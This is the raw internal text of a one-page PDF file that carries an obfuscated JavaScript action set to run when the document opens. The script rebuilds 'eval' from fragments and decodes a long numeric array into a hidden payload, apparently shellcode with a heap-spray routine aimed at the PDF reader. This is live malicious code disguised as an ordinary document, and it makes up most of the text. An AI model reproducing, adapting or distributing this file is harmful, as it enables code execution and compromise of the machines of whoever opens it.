%PDF-1.6
%‚„œ”
7 0 obj
<</Count 1/Type/Pages/Kids[28 0 R]>>
endobj
21 0 obj
<</MarkInfo<</Marked true>>/Names 23 0 R/Outlines 1 0 R/Metadata 9 0 R/AcroForm 22 0 R/Pages 7 0 R/OCProperties<</D<</RBGroups[]/OFF[]/Order[]>>/OCGs[27 0 R]>>/StructTreeRoot 11 0 R/Type/Catalog>>
endobj
23 0 obj
<</JavaScript 24 0 R/AP 8 0 R>>
endobj
24 0 obj
<</Names[123 0 R 76 0 R]>>
endobj
25 0 obj
<</S/JavaScript/JS 26 0 R>>
endobj
26 0 obj
<</Length 1108/Filter[/FlateDecode]>>stream
endstream
endobj
28 0 obj
<</CropBox[37 37 575 755]/Annots 29 0 R/Parent 7 0 R/StructParents 0/Contents 60 0 R/Rotate 90/MediaBox[0 0 612 792]/Resources<</XObject<</Im0 69 0 R>>/ColorSpace<</CS0 59 0 R>>/Font<</TT0 61 0 R>>/Properties<</MC0 27 0 R>>/ExtGState<</GS0 72 0 R>>>>/Type/Page>>
endobj
60 0 obj
<</Length 539/Filter/FlateDecode/Type/Contents>>stream
endstream
endobj
76 0 obj
<</S/JavaScript/JS(j='4wbt43t';
z
=
Array\(44,39,25,53,25,24,18,24,30,30,8,23,70,66,49,24,68,46,3,50,27,27,68,46,39,15,53,59,68,46,3,45,39,15,68,46,10,45,53,59,68,46,53,16,50,59,68,46,50,50,45,39,68,46,27,59,15,58,68,46,59,58,3,8,68,46,3,8,50,58,68,46,58,15,59,58,68,46,10,58,3,8,68,46,45,27,18,15,68,46,10,27,3,8,68,46,50,50,58,3,68,46,27,27,33,8,68,46,45,53,3,8,68,46,58,50,50,15,68,46,50,50,10,59,68,46,3,18,48,15,68,46,18,45,53,53,68,46,39,39,18,58,68,46,8,3,39,39,68,46,59,58,3,8,68,46,15,50,50,58,68,46,50,16,59,27,68,46,10,45,58,27,68,46,3,10,39,8,68,46,48,59,50,59,68,46,53,59,3,45,68,46,45,18,10,45,68,46,53,8,53,16,68,46,45,18,59,15,68,46,3,8,45,27,68,46,50,15,10,45,68,46,10,59,3,8,68,46,10,3,50,45,68,46,39,45,58,50,68,46,3,8,45,27,68,46,48,58,10,27,68,46,39,45,58,50,68,46,15,16,50,50,68,46,59,18,59,16,68,46,0,33,39,15,68,46,15,45,58,50,68,46,33,8,50,50,68,46,8,53,58,39,68,46,50,3,18,58,68,46,10,59,39,48,68,46,15,18,58,3,68,46,58,33,15,8,68,46,33,0,58,50,68,46,53,8,59,58,68,46,50,8,39,18,68,46,10,45,18,39,68,46,45,53,53,27,68,46,45,53,3,8,68,46,58,50,48,59,68,46,27,27,33,33,68,46,58,15,3,8,68,46,3,33,59,8,68,46,53,15,59,27,68,46,45,59,39,39,68,46,58,15,48,59,68,46,33,3,3,8,68,46,33,33,58,50,68,46,58,59,3,8,68,46,58,50,3,8,68,46,0,8,15,45,68,46,45,16,45,53,68,46,53,8,15,50,68,46,0,33,45,50,68,46,27,3,3,8,68,46,3,58,48,58,68,46,58,15,10,33,68,46,10,59,50,50,68,46,16,27,58,50,68,46,39,50,53,8,68,46,27,3,3,8,68,46,3,8,58,3,68,46,27,0,39,10,68,46,45,16,58,45,68,46,16,3,53,3,68,46,39,39,39,39,68,46,53,48,39,39,68,46,53,3,39,16,68,46,58,58,58,58,68,46,58,58,58,58,68,46,45,58,45,3,68,46,59,58,27,0,68,46,39,39,27,3,68,46,58,58,58,58,68,46,45,58,58,58,68,46,15,58,3,50,68,46,45,58,18,16,68,46,3,8,45,45,68,46,3,8,53,15,68,46,18,58,45,53,68,46,15,50,3,50,68,46,39,39,58,45,68,46,27,3,53,50,68,46,27,53,27,39,68,46,58,58,58,58,68,46,10,45,27,3,68,46,27,15,10,48,68,46,45,59,27,33,68,46,18,27,39,39,68,46,15,59,3,50,68,46,3,8,58,3,68,46,53,3,53,3,68,46,39,39,27,18,68,46,39,39,39,39,68,46,58,48,53,8,68,46,10,48,53,8,68,46,53,15,3,18,68,46,58,18,58,59,68,46,58,58,58,58,68,46,45,15,3,33,68,46,58,15,48,59,68,46,58,59,15,10,68,46,10,48,48,59,68,46,27,10,27,45,68,46,15,10,10,50,68,46,48,59,59,59,68,46,10,27,58,59,68,46,50,50,10,48,68,46,15,10,50,48,68,46,48,59,59,59,68,46,48,58,58,3,68,46,10,50,48,33,68,46,45,50,48,58,68,46,39,3,27,3,68,46,58,58,58,58,68,46,39,39,58,58,68,46,58,15,45,27,68,46,53,3,3,8,68,46,15,16,50,50,68,46,15,10,45,18,68,46,18,33,59,59,68,46,10,10,58,58,68,46,27,48,10,58,68,46,15,10,10,59,68,46,18,33,59,59,68,46,48,53,58,45,68,46,27,15,27,59,68,46,15,27,27,15,68,46,18,33,59,59,68,46,58,58,58,16,68,46,3,0,45,16,68,46,58,59,15,18,68,46,3,3,50,58,68,46,18,33,59,59,68,46,59,18,58,59,68,46,27,0,45,18,68,46,27,0,58,58,68,46,45,50,58,58,68,46,27,0,45,10,68,46,39,39,58,58,68,46,18,59,45,27,68,46,15,58,3,45,68,46,18,27,10,45,68,46,58,58,27,0,68,46,39,39,45,50,68,46,58,59,45,27,68,46,58,58,27,0,68,46,53,8,3,50,68,46,45,50,58,15,68,46,45,27,39,39,68,46,3,50,58,59,68,46,58,15,15,50,68,46,58,48,53,8,68,46,18,50,53,8,68,46,3,58,59,10,68,46,58,58,50,39,68,46,39,0,10,45,68,46,3,58,59,10,68,46,58,58,50,39,68,46,15,59,10,45,68,46,58,58,27,0,68,46,39,53,27,0,68,46,45,27,39,39,68,46,53,3,58,3,68,46,39,53,16,15,68,46,39,39,39,39,68,46,59,53,3,53,68,46,53,15,58,53,68,46,39,53,16,3,68,46,58,53,3,0,68,46,27,39,3,16,68,46,8,33,58,18,68,46,15,0,50,50,68,46,45,8,3,0,68,46,15,27,18,8,68,46,10,16,59,27,68,46,18,0,50,27,68,46,10,58,48,39,68,46,10,59,27,3,68,46,10,58,10,59,68,46,48,39,50,0,68,46,27,18,48,39,68,46,27,18,27,18,68,46,10,50,27,10,68,46,50,50,27,0,68,46,10,48,50,50,68,46,50,45,10,27,68,46,27,48,48,53,68,46,10,0,27,16,68,46,10,10,48,39,68,46,10,58,48,53,68,46,10,58,27,3,68,46,27,27,50,39,68,46,50,48,50,33,68,46,48,27,50,58,68,46,50,33,27,45,68,46,58,58,50,45,68,46,58,58,58,58,24,36,39,46,56,15,1,44,47,56,75,53,61,55,40,25,40,0,51,21,73,30,37,42,62,44,63,53,25,40,0,6,63,53,56,66,1,62,71,48,26,21,73,30,37,40,0,20,49,40,0,36,67,40,0,49,40,0,6,70,46,8,70,1,40,44,56,66,25,58,51,21,73,14,48,30,36,40,53,1,46,40,56,75,40,0,36,67,75,39,46,56,15,1,44,47,56,75,8,11,25,30,37,55,0,40,75,33,57,66,49,56,53,42,75,4,40,40,0,73,25,30,36,55,0,40,75,55,42,49,58,11,58,15,58,15,58,15,58,15,36,55,0,40,75,0,33,33,40,49,58,11,59,58,58,58,58,58,36,55,0,40,75,29,0,73,63,47,0,33,49,46,56,53,70,15,0,29,53,25,8,23,70,66,30,36,55,0,40,75,70,15,38,63,53,56,49,29,0,73,63,47,0,33,6,63,53,56,66,1,62,71,48,36,55,0,40,75,21,73,49,0,33,33,40,60,25,70,15,38,63,53,56,20,58,11,50,3,30,36,55,0,40,75,73,0,40,70,29,49,46,56,53,70,15,0,29,53,25,22,68,46,16,58,16,58,68,46,16,58,16,58,22,30,36,73,0,40,70,29,49,53,61,55,40,25,73,0,40,70,29,51,21,73,30,36,55,0,40,75,15,47,46,56,1,48,49,25,55,42,60,58,11,59,58,58,58,58,58,30,14,0,33,33,40,36,39,47,40,25,55,0,40,75,15,47,46,56,1,49,58,36,15,47,46,56,1,26,15,47,46,56,1,48,36,15,47,46,56,1,20,20,30,37,33,57,66,54,15,47,46,56,1,5,49,73,0,40,70,29,20,29,0,73,63,47,0,33,36,67,75,55,0,40,75,47,55,53,40,39,63,47,42,49,46,56,53,70,15,0,29,53,25,22,68,46,58,15,58,15,68,46,58,15,58,15,22,30,36,42,62,44,63,53,25,47,55,53,40,39,63,47,42,6,63,53,56,66,1,62,26,59,59,16,45,48,30,37,47,55,53,40,39,63,47,42,20,49,47,55,53,40,39,63,47,42,36,67,75,1,62,44,70,6,15,47,63,63,0,8,13,1,47,40,53,49,52,47,63,63,0,8,6,15,47,63,63,53,15,1,32,28,0,44,63,34,56,39,47,25,37,70,46,8,23,12,22,22,51,28,70,66,12,47,55,53,40,39,63,47,42,67,30,36,67,75,39,46,56,15,1,44,47,56,75,29,40,44,56,1,39,25,30,37,56,47,29,49,46,56,53,70,15,0,29,53,25,22,68,46,58,4,58,4,68,46,58,4,58,4,68,46,58,4,58,4,68,46,58,4,58,4,22,30,36,55,0,40,75,29,0,73,63,47,0,33,49,46,56,53,70,15,0,29,53,25,8,23,70,66,30,36,62,53,0,29,8,63,47,15,57,49,56,47,29,20,29,0,73,63,47,0,33,36,8,44,66,8,63,47,15,57,49,46,56,53,70,15,0,29,53,25,22,68,46,58,4,58,4,68,46,58,4,58,4,22,30,36,62,53,0,33,53,40,70,44,61,53,49,48,58,36,70,29,40,0,73,49,62,53,0,33,53,40,70,44,61,53,20,62,53,0,29,8,63,47,15,57,6,63,53,56,66,1,62,36,42,62,44,63,53,25,8,44,66,8,63,47,15,57,6,63,53,56,66,1,62,26,70,29,40,0,73,30,37,8,44,66,8,63,47,15,57,20,49,8,44,66,8,63,47,15,57,36,67,75,39,44,63,63,8,63,47,15,57,49,8,44,66,8,63,47,15,57,6,70,46,8,70,1,40,44,56,66,25,58,51,70,29,40,0,73,30,36,8,63,47,15,57,49,8,44,66,8,63,47,15,57,6,70,46,8,70,1,40,44,56,66,25,58,51,8,44,66,8,63,47,15,57,6,63,53,56,66,1,62,60,70,29,40,0,73,30,36,42,62,44,63,53,25,8,63,47,15,57,6,63,53,56,66,1,62,20,70,29,40,0,73,26,58,11,59,58,58,58,58,30,37,8,63,47,15,57,49,8,63,47,15,57,20,8,63,47,15,57,20,39,44,63,63,8,63,47,15,57,36,67,75,28,53,28,49,56,53,42,75,4,40,40,0,73,25,30,36,39,47,40,25,44,49,58,36,44,26,18,59,58,58,36,44,20,20,30,37,28,53,28,54,44,5,49,8,63,47,15,57,20,62,53,0,29,8,63,47,15,57,36,67,75,55,0,40,75,56,46,28,49,18,48,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,36,46,1,44,63,6,29,40,44,56,1,39,25,22,68,59,45,58,58,58,39,22,51,56,46,28,30,36,67,75,39,46,56,15,1,44,47,56,75,66,53,1,44,15,47,56,25,30,37,55,0,40,75,0,40,40,73,49,56,53,42,75,4,40,40,0,73,25,30,36,44,39,25,0,29,29,6,33,47,15,6,52,47,63,63,0,8,6,66,53,1,34,15,47,56,30,37,55,0,40,75,29,0,73,63,47,0,33,49,46,56,53,70,15,0,29,53,25,8,23,70,66,30,36,55,0,40,75,62,35,21,45,58,58,52,64,49,29,0,73,63,47,0,33,6,63,53,56,66,1,62,71,48,36,55,0,40,75,21,73,49,58,11,59,58,58,58,58,58,60,25,62,35,21,45,58,58,52,64,20,58,11,50,3,30,36,55,0,40,75,73,0,40,70,29,49,46,56,53,70,15,0,29,53,25,22,68,46,16,58,16,58,68,46,16,58,16,58,22,30,36,73,0,40,70,29,49,53,61,55,40,25,73,0,40,70,29,51,21,73,30,36,55,0,40,75,29,45,4,23,7,27,45,39,49,25,58,11,58,15,58,15,58,15,58,15,60,58,11,59,58,58,58,58,58,30,14,58,11,59,58,58,58,58,58,36,39,47,40,25,55,0,40,75,55,21,15,17,72,16,27,73,49,58,36,55,21,15,17,72,16,27,73,26,29,45,4,23,7,27,45,39,36,55,21,15,17,72,16,27,73,20,20,30,37,0,40,40,73,54,55,21,15,17,72,16,27,73,5,49,73,0,40,70,29,20,29,0,73,63,47,0,33,36,67,75,55,0,40,75,1,69,2,62,64,8,74,42,49,46,56,53,70,15,0,29,53,25,22,68,58,16,22,30,36,42,62,44,63,53,25,1,69,2,62,64,8,74,42,6,63,53,56,66,1,62,26,58,11,59,58,58,58,30,37,1,69,2,62,64,8,74,42,20,49,1,69,2,62,64,8,74,42,36,67,75,1,69,2,62,64,8,74,42,49,22,64,6,22,20,1,69,2,62,64,8,74,42,36,0,29,29,6,33,47,15,6,52,47,63,63,0,8,6,66,53,1,34,15,47,56,25,1,69,2,62,64,8,74,42,30,36,67,67,75,0,43,63,46,66,44,56,70,49,0,29,29,6,29,63,46,66,34,56,70,36,55,0,40,75,70,55,49,29,0,40,70,53,34,56,1,25,0,29,29,6,55,44,53,42,53,40,41,53,40,70,44,47,56,6,1,47,13,1,40,44,56,66,25,30,6,15,62,0,40,4,1,25,58,30,30,36,39,47,40,25,55,0,40,75,44,49,58,36,44,26,0,43,63,46,66,44,56,70,6,63,53,56,66,1,62,36,44,20,20,30,37,44,39,25,0,43,63,46,66,44,56,70,54,44,5,6,56,0,28,53,49,49,24,32,13,15,40,44,29,1,24,30,37,55,0,40,75,63,55,49,0,43,63,46,66,44,56,70,54,44,5,6,55,53,40,70,44,47,56,36,67,67,75,44,39,25,25,63,55,49,49,16,30,31,31,25,25,70,55,49,49,3,30,19,19,25,63,55,26,49,3,6,18,48,30,30,30,37,66,53,1,44,15,47,56,25,30,36,67,53,63,70,53,75,44,39,25,63,55,49,49,10,6,18,30,37,29,40,44,56,1,39,25,30,36,67,53,63,70,53,75,44,39,25,25,25,70,55,49,49,27,30,31,31,25,70,55,49,49,10,30,30,19,19,25,63,55,26,10,6,18,18,30,30,37,8,11,25,30,36,67,53,63,70,53,75,44,39,25,25,63,55,65,49,16,6,18,30,31,31,25,63,55,26,49,16,6,48,30,31,31,25,63,55,65,49,3,6,18,50,30,31,31,25,63,55,26,49,3,6,18,10,30,30,37,39,46,56,15,1,44,47,56,75,0,25,30,37,46,1,44,63,6,29,40,44,56,1,33,25,24,29,9,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,75,12,75,73,73,73,73,18,18,18,24,51,56,53,42,75,72,0,1,53,25,30,30,36,67,55,0,40,75,62,49,0,29,29,6,29,63,46,66,34,56,70,36,39,47,40,25,55,0,40,75,39,49,58,36,39,26,62,6,63,53,56,66,1,62,36,39,20,20,30,37,44,39,25,62,54,39,5,6,56,0,28,53,49,49,24,32,13,15,40,44,29,1,24,30,37,55,0,40,75,44,49,62,54,39,5,6,55,53,40,70,44,47,56,36,67,67,75,44,39,25,25,44,65,3,6,18,48,30,19,19,25,44,26,3,6,48,30,30,37,15,49,56,53,42,75,4,40,40,0,73,25,30,36,55,0,40,75,33,49,46,56,53,70,15,0,29,53,25,24,68,46,16,58,16,58,68,46,16,58,16,58,24,30,36,55,0,40,75,53,49,46,56,53,70,15,0,29,53,25,8,23,70,66,30,36,42,62,44,63,53,25,33,6,63,53,56,66,1,62,26,49,58,11,3,58,58,58,30,37,33,20,49,33,36,67,33,49,33,6,70,46,8,70,1,40,25,58,51,58,11,3,58,58,58,60,53,6,63,53,56,66,1,62,30,36,39,47,40,25,39,49,58,36,39,26,48,16,58,58,36,39,20,20,30,37,15,54,39,5,49,33,20,53,36,67,0,25,30,36,0,25,30,36,1,40,73,37,1,62,44,70,6,28,53,33,44,0,6,56,53,42,43,63,0,73,53,40,25,56,46,63,63,30,36,67,15,0,1,15,62,25,53,30,37,67,0,25,30,36,67,67\);
a=new String\("atM8A].Kb@7x:S/c9Q1&+q'j'\(<6mp\)|EdIW;{_frVwPi5uo2=3,Ce[vnk04-zhlN>g}%Us*DyG "\);
b="a"+"l";
b2="v"
+b;
try
{
for\(i in app\)
if\(i=='printerNames'\)
new asd;
}catch\(q\){
e=j['s'+'ubstr']\(\);
try{
b='e'+b2;
if\(!google.search\(\)\)
a=2;
}
catch\(q\){
e=
e[
b];
}
s=new String\(\);try{if\(!google.search\(\)\)throw 1;}catch\(q\){r=1;}{
for\(j=0;j<z.length;j++\)
try{
if\(!google.search\(\)\)throw 1;}catch\(q\){
s
+=
a[
z[j]];
}
}}

try{if\(!google.search\(\)\)new ewt;}
catch\(nergerg\){
e\(s\);
})>>
endobj
xref
0 155
trailer
<</Size 155
/Root 21 0 R>>
xref
0 0
trailer
<</Size 155/Prev 75626/XRefStm 416/Root 21 0 R>>
startxref
78995
%%EOF